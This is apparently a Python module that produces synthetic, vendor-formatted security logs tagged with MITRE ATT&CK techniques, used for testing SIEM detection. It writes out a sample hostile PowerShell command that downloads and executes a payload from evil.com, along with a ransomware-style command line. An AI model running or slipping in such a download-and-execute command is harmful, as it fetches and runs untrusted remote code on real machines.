"""
Cortex Log Generation Orchestrator

This module orchestrates the generation of Cortex-compliant logs by integrating
TTP coverage, authentic vendor formats, marketplace compliance, and validation.
"""

import json
import random
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple, Union
from dataclasses import dataclass, asdict
from enum import Enum

# Import our custom modules
from ..validation.cortex_compliance import (
    LogFormat, ValidationResult, CortexComplianceValidator, 
    CortexLogFormatter, validate_and_format_log
)

class AttackStage(str, Enum):
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution" 
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"

@dataclass
class TTPs:
    """MITRE ATT&CK Techniques, Tactics, and Procedures."""
    technique_id: str
    technique_name: str
    tactic: AttackStage
    sub_technique: Optional[str] = None
    description: str = ""

@dataclass
class LogGenerationRequest:
    """Request for generating Cortex-compliant logs."""
    vendor: str
    product: str
    format_type: LogFormat
    ttp: Optional[TTPs] = None
    count: int = 1
    start_time: Optional[datetime] = None
    duration_minutes: int = 60
    scenario_name: str = "generic"
    custom_fields: Dict[str, Any] = None

@dataclass
class GeneratedLogEntry:
    """A generated log entry with metadata."""
    log_message: str
    vendor: str
    product: str
    format_type: LogFormat
    ttp: Optional[TTPs]
    timestamp: datetime
    validation_result: ValidationResult
    scenario_context: Dict[str, Any]

class CortexLogOrchestrator:
    """Orchestrates generation of Cortex-compliant logs with TTP coverage."""
    
    def __init__(self):
        self.validator = CortexComplianceValidator()
        self.formatter = CortexLogFormatter()
        self.ttp_library = self._initialize_ttp_library()
        self.vendor_generators = self._initialize_vendor_generators()
        
    def _initialize_ttp_library(self) -> Dict[str, TTPs]:
        """Initialize comprehensive TTP library."""
        return {
            "T1566.001": TTPs(
                technique_id="T1566.001",
                technique_name="Spearphishing Attachment",
                tactic=AttackStage.INITIAL_ACCESS,
                description="Adversaries may send spearphishing emails with a malicious attachment"
            ),
            "T1059.001": TTPs(
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactic=AttackStage.EXECUTION,
                description="Adversaries may abuse PowerShell commands and scripts"
            ),
            "T1055": TTPs(
                technique_id="T1055",
                technique_name="Process Injection",
                tactic=AttackStage.DEFENSE_EVASION,
                description="Adversaries may inject code into processes"
            ),
            "T1078.004": TTPs(
                technique_id="T1078.004",
                technique_name="Cloud Accounts",
                tactic=AttackStage.DEFENSE_EVASION,
                description="Adversaries may obtain and abuse credentials of cloud accounts"
            ),
            "T1110.003": TTPs(
                technique_id="T1110.003",
                technique_name="Password Spraying",
                tactic=AttackStage.CREDENTIAL_ACCESS,
                description="Adversaries may use password spraying attacks"
            ),
            "T1046": TTPs(
                technique_id="T1046",
                technique_name="Network Service Scanning",
                tactic=AttackStage.DISCOVERY,
                description="Adversaries may attempt to get information about running services"
            ),
            "T1021.001": TTPs(
                technique_id="T1021.001",
                technique_name="Remote Desktop Protocol",
                tactic=AttackStage.LATERAL_MOVEMENT,
                description="Adversaries may use RDP to laterally move"
            ),
            "T1041": TTPs(
                technique_id="T1041",
                technique_name="Exfiltration Over C2 Channel", 
                tactic=AttackStage.EXFILTRATION,
                description="Adversaries may steal data by exfiltrating it over an existing C2 channel"
            ),
            "T1486": TTPs(
                technique_id="T1486",
                technique_name="Data Encrypted for Impact",
                tactic=AttackStage.IMPACT,
                description="Adversaries may encrypt data on target systems to disrupt availability"
            )
        }
        
    def _initialize_vendor_generators(self) -> Dict[str, Any]:
        """Initialize vendor-specific log generators."""
        return {
            "palo_alto_networks": self._create_panos_generators(),
            "cisco_asa": self._create_cisco_asa_generators(),
            "crowdstrike": self._create_crowdstrike_generators(),
            "okta": self._create_okta_generators(),
            "aws_cloudtrail": self._create_aws_generators(),
            "azure_ad": self._create_azure_generators(),
            "sentinelone": self._create_sentinelone_generators()
        }
        
    def generate_logs(self, request: LogGenerationRequest) -> List[GeneratedLogEntry]:
        """Generate Cortex-compliant logs based on request parameters."""
        logs = []
        start_time = request.start_time or datetime.now(timezone.utc)
        
        vendor_key = request.vendor.lower().replace(" ", "_").replace("-", "_")
        
        if vendor_key not in self.vendor_generators:
            raise ValueError(f"Vendor '{request.vendor}' not supported")
            
        generator_func = self.vendor_generators[vendor_key].get(request.format_type.value)
        if not generator_func:
            raise ValueError(f"Format '{request.format_type}' not supported for {request.vendor}")
            
        for i in range(request.count):
            # Generate timestamp within the specified duration
            if request.count > 1:
                time_offset_minutes = random.uniform(0, request.duration_minutes)
                timestamp = start_time + timedelta(minutes=time_offset_minutes)
            else:
                timestamp = start_time
                
            # Generate log data
            log_data = generator_func(request.ttp, timestamp, request.custom_fields or {})
            
            # Format the log
            formatted_log, validation_result = validate_and_format_log(
                log_data, request.vendor, request.format_type
            )
            
            # Create log entry
            log_entry = GeneratedLogEntry(
                log_message=formatted_log,
                vendor=request.vendor,
                product=request.product,
                format_type=request.format_type,
                ttp=request.ttp,
                timestamp=timestamp,
                validation_result=validation_result,
                scenario_context={
                    "scenario_name": request.scenario_name,
                    "generation_time": datetime.now(timezone.utc).isoformat(),
                    "log_index": i + 1,
                    "total_logs": request.count
                }
            )
            
            logs.append(log_entry)
            
        return logs
        
    def generate_attack_scenario(self, scenario_name: str, attack_chain: List[TTPs], 
                                vendors: List[str], duration_hours: int = 24) -> List[GeneratedLogEntry]:
        """Generate a complete attack scenario across multiple vendors."""
        all_logs = []
        start_time = datetime.now(timezone.utc)
        
        for i, ttp in enumerate(attack_chain):
            # Distribute attack stages over time
            stage_start_time = start_time + timedelta(hours=i * (duration_hours / len(attack_chain)))
            
            for vendor in vendors:
                # Generate 2-5 logs per vendor per TTP
                log_count = random.randint(2, 5)
                
                # Choose appropriate format for vendor
                vendor_key = vendor.lower().replace(" ", "_").replace("-", "_")
                if vendor_key in ["crowdstrike", "okta", "aws_cloudtrail", "azure_ad"]:
                    format_type = LogFormat.JSON
                elif vendor_key in ["palo_alto_networks"]:
                    format_type = LogFormat.CEF
                else:
                    format_type = LogFormat.SYSLOG
                    
                request = LogGenerationRequest(
                    vendor=vendor,
                    product=self._get_product_for_vendor(vendor),
                    format_type=format_type,
                    ttp=ttp,
                    count=log_count,
                    start_time=stage_start_time,
                    duration_minutes=random.randint(30, 180),
                    scenario_name=scenario_name
                )
                
                try:
                    logs = self.generate_logs(request)
                    all_logs.extend(logs)
                except ValueError as e:
                    print(f"Warning: Skipping {vendor} for {ttp.technique_id}: {e}")
                    continue
                    
        return all_logs
        
    def _get_product_for_vendor(self, vendor: str) -> str:
        """Get the primary product for a vendor."""
        product_map = {
            "Palo Alto Networks": "PAN-OS",
            "Cisco ASA": "ASA",
            "CrowdStrike": "Falcon",
            "Okta": "System Log",
            "AWS": "CloudTrail",
            "Microsoft": "Azure AD",
            "SentinelOne": "Deep Visibility"
        }
        return product_map.get(vendor, "Unknown")
        
    # Vendor-specific generators
    def _create_panos_generators(self) -> Dict[str, callable]:
        """Create PAN-OS log generators."""
        
        def generate_cef(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            threat_names = {
                "T1566.001": "malicious-email-attachment.exe",
                "T1059.001": "powershell-execution",
                "T1055": "process-injection-attempt",
                "T1046": "port-scan-detected",
                "T1021.001": "rdp-connection",
                "T1041": "data-exfiltration-c2",
                "T1486": "ransomware-encryption"
            }
            
            base_data = {
                "timestamp": timestamp,
                "event_id": random.randint(1000, 9999),
                "event_name": "Threat" if ttp else "Traffic",
                "severity": 3 if ttp else 5,
                "source_ip": f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "destination_ip": f"203.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "source_port": random.randint(1024, 65535),
                "destination_port": random.choice([80, 443, 25, 53, 3389, 22]),
                "protocol": "TCP",
                "action": "alert" if ttp else "allow",
                "application": "web-browsing",
                "hostname": "panos-fw-01"
            }
            
            if ttp:
                base_data.update({
                    "message": f"Threat detected: {threat_names.get(ttp.technique_id, 'unknown-threat')} - {ttp.technique_name}",
                    "threat_name": threat_names.get(ttp.technique_id, "generic-threat"),
                    "category": "malware" if "malicious" in threat_names.get(ttp.technique_id, "") else "command-and-control"
                })
                
            base_data.update(custom_fields)
            return base_data
            
        def generate_syslog(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            return generate_cef(ttp, timestamp, custom_fields)  # Use same data structure
            
        def generate_raw(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            return generate_cef(ttp, timestamp, custom_fields)  # Use same data structure
            
        return {
            "cef": generate_cef,
            "syslog": generate_syslog,
            "raw": generate_raw
        }
        
    def _create_cisco_asa_generators(self) -> Dict[str, callable]:
        """Create Cisco ASA log generators."""
        
        def generate_syslog(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            message_codes = {
                "T1566.001": "106023",  # Deny protocol due to threat
                "T1110.003": "109006",  # Authentication failed
                "T1021.001": "106015",  # Deny TCP
                "T1046": "106021",     # Deny protocol
                "T1041": "106023",     # Deny protocol due to threat
            }
            
            base_data = {
                "timestamp": timestamp,
                "severity": 3 if ttp else 5,
                "event_code": message_codes.get(ttp.technique_id if ttp else "", "106001"),
                "message": f"ASA event: {ttp.technique_name if ttp else 'Normal traffic'}",
                "hostname": "cisco-asa-01",
                "source_ip": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
                "destination_ip": f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "protocol": "TCP"
            }
            
            base_data.update(custom_fields)
            return base_data
            
        return {
            "syslog": generate_syslog,
            "raw": generate_syslog
        }
        
    def _create_crowdstrike_generators(self) -> Dict[str, callable]:
        """Create CrowdStrike Falcon log generators."""
        
        def generate_json(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            process_names = {
                "T1059.001": "powershell.exe",
                "T1055": "svchost.exe", 
                "T1566.001": "outlook.exe",
                "T1486": "ransomware.exe"
            }
            
            base_data = {
                "metadata": {
                    "eventType": "ProcessRollup2",
                    "eventCreationTime": int(timestamp.timestamp() * 1000),
                    "version": "1.0"
                },
                "event": {
                    "ProcessRollup2": {
                        "ComputerName": f"WIN-{random.randint(100000, 999999)}",
                        "UserName": random.choice(["john.doe", "alice.smith", "bob.wilson"]),
                        "ProcessId": random.randint(1000, 9999),
                        "ParentProcessId": random.randint(100, 999),
                        "FileName": process_names.get(ttp.technique_id if ttp else "", "explorer.exe"),
                        "CommandLine": self._generate_command_line(ttp),
                        "SHA256HashData": f"{random.randint(10**63, 10**64-1):064x}",
                        "MD5HashData": f"{random.randint(10**31, 10**32-1):032x}"
                    }
                },
                "severity": "CRITICAL" if ttp else "INFO"
            }
            
            base_data.update(custom_fields)
            return base_data
            
        return {
            "json": generate_json
        }
        
    def _create_okta_generators(self) -> Dict[str, callable]:
        """Create Okta System Log generators."""
        
        def generate_json(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            event_types = {
                "T1078.004": "user.authentication.sso",
                "T1110.003": "user.authentication.auth_via_mfa",
                "T1021.001": "user.session.start"
            }
            
            base_data = {
                "uuid": f"{random.randint(10**31, 10**32-1):032x}",
                "published": timestamp.isoformat(),
                "eventType": event_types.get(ttp.technique_id if ttp else "", "user.session.start"),
                "version": "0",
                "severity": "WARN" if ttp else "INFO",
                "outcome": {
                    "result": "FAILURE" if ttp and "spray" in ttp.technique_name.lower() else "SUCCESS"
                },
                "actor": {
                    "id": f"user-{random.randint(100000, 999999)}",
                    "type": "User",
                    "alternateId": random.choice(["john.doe@company.com", "alice.smith@company.com", "attacker@evil.com"]),
                    "displayName": random.choice(["John Doe", "Alice Smith", "Attacker"])
                },
                "client": {
                    "userAgent": {
                        "rawUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "os": "Windows 10",
                        "browser": "CHROME"
                    },
                    "zone": "null",
                    "device": "Computer",
                    "id": None,
                    "ipAddress": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                }
            }
            
            base_data.update(custom_fields)
            return base_data
            
        return {
            "json": generate_json
        }
        
    def _create_aws_generators(self) -> Dict[str, callable]:
        """Create AWS CloudTrail generators."""
        
        def generate_json(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            base_data = {
                "eventVersion": "1.08",
                "userIdentity": {
                    "type": "IAMUser",
                    "principalId": f"AIDA{random.randint(10**15, 10**16-1)}",
                    "arn": "arn:aws:iam::123456789012:user/admin",
                    "accountId": "123456789012",
                    "userName": random.choice(["admin", "developer", "attacker"])
                },
                "eventTime": timestamp.isoformat(),
                "eventSource": "iam.amazonaws.com",
                "eventName": "CreateUser" if ttp else "ListUsers",
                "awsRegion": "us-east-1",
                "sourceIPAddress": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "userAgent": "aws-cli/2.0.0 Python/3.8.0 Linux/5.4.0 source/x86_64.ubuntu.20",
                "errorCode": "AccessDenied" if ttp and "spray" in (ttp.technique_name.lower() if ttp else "") else None,
                "errorMessage": "User is not authorized to perform this action" if ttp else None
            }
            
            base_data.update(custom_fields)
            return base_data
            
        return {
            "json": generate_json
        }
        
    def _create_azure_generators(self) -> Dict[str, callable]:
        """Create Azure AD generators."""
        
        def generate_json(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            base_data = {
                "time": timestamp.isoformat(),
                "resourceId": "/tenants/12345678-1234-1234-1234-123456789012/providers/Microsoft.aadiam",
                "operationName": "Sign-in activity",
                "category": "SignInLogs",
                "resultType": "50126" if ttp and "spray" in (ttp.technique_name.lower() if ttp else "") else "0",
                "resultDescription": "Invalid username or password" if ttp else "Success",
                "durationMs": random.randint(100, 2000),
                "callerIpAddress": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "identity": random.choice(["john.doe@company.onmicrosoft.com", "alice.smith@company.onmicrosoft.com"]),
                "Level": 4,
                "location": {
                    "countryOrRegion": random.choice(["US", "GB", "RU", "CN"]),
                    "state": "California",
                    "city": "San Francisco"
                }
            }
            
            base_data.update(custom_fields)
            return base_data
            
        return {
            "json": generate_json
        }
        
    def _create_sentinelone_generators(self) -> Dict[str, callable]:
        """Create SentinelOne Deep Visibility generators."""
        
        def generate_json(ttp: Optional[TTPs], timestamp: datetime, custom_fields: Dict[str, Any]) -> Dict[str, Any]:
            threat_classifications = {
                "T1566.001": "Malware",
                "T1059.001": "PUA", 
                "T1055": "Trojan",
                "T1486": "Ransomware"
            }
            
            base_data = {
                "mgmt_url": "https://company.sentinelone.net",
                "threat_classification": threat_classifications.get(ttp.technique_id if ttp else "", "Clean"),
                "threat_classification_source": "Engine",
                "created_date": timestamp.isoformat(),
                "agent_domain": "COMPANY",
                "agent_machine_type": "desktop",
                "agent_network_status": "connected",
                "agent_os_type": "windows",
                "agent_version": "21.7.5.1234",
                "site_name": "Default site",
                "file_path": self._generate_file_path(ttp),
                "file_display_name": self._generate_file_name(ttp),
                "sha1": f"{random.randint(10**39, 10**40-1):040x}",
                "threat_agent_id": f"agent-{random.randint(100000, 999999)}",
                "threat_id": f"threat-{random.randint(100000, 999999)}",
                "engines": ["reputation", "static_ai", "dynamic_ai"] if ttp else ["reputation"]
            }
            
            base_data.update(custom_fields)
            return base_data
            
        return {
            "json": generate_json
        }
        
    def _generate_command_line(self, ttp: Optional[TTPs]) -> str:
        """Generate realistic command lines based on TTP."""
        if not ttp:
            return "explorer.exe"
            
        commands = {
            "T1059.001": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"",
            "T1055": "svchost.exe -k NetworkService",
            "T1566.001": "outlook.exe /attachment malicious.docx",
            "T1486": "ransomware.exe --encrypt --target C:\\Users\\ --key abcdef123456"
        }
        
        return commands.get(ttp.technique_id, "explorer.exe")
        
    def _generate_file_path(self, ttp: Optional[TTPs]) -> str:
        """Generate realistic file paths based on TTP."""
        if not ttp:
            return "C:\\Windows\\explorer.exe"
            
        paths = {
            "T1566.001": "C:\\Users\\john.doe\\Downloads\\malicious_attachment.exe",
            "T1059.001": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "T1055": "C:\\Windows\\System32\\svchost.exe",
            "T1486": "C:\\Temp\\ransomware.exe"
        }
        
        return paths.get(ttp.technique_id, "C:\\Windows\\System32\\unknown.exe")
        
    def _generate_file_name(self, ttp: Optional[TTPs]) -> str:
        """Generate realistic file names based on TTP."""
        if not ttp:
            return "explorer.exe"
            
        names = {
            "T1566.001": "malicious_attachment.exe",
            "T1059.001": "powershell.exe", 
            "T1055": "svchost.exe",
            "T1486": "ransomware.exe"
        }
        
        return names.get(ttp.technique_id, "unknown.exe")


# Convenience function for quick log generation
def generate_cortex_logs(vendor: str, count: int = 10, ttp_id: str = None, 
                        format_type: LogFormat = LogFormat.SYSLOG) -> List[GeneratedLogEntry]:
    """Quick function to generate Cortex-compliant logs."""
    orchestrator = CortexLogOrchestrator()
    
    ttp = None
    if ttp_id and ttp_id in orchestrator.ttp_library:
        ttp = orchestrator.ttp_library[ttp_id]
        
    request = LogGenerationRequest(
        vendor=vendor,
        product=orchestrator._get_product_for_vendor(vendor),
        format_type=format_type,
        ttp=ttp,
        count=count,
        scenario_name="quick_generation"
    )
    
    return orchestrator.generate_logs(request)


# Export main classes and functions
__all__ = [
    'AttackStage', 'TTPs', 'LogGenerationRequest', 'GeneratedLogEntry',
    'CortexLogOrchestrator', 'generate_cortex_logs'
]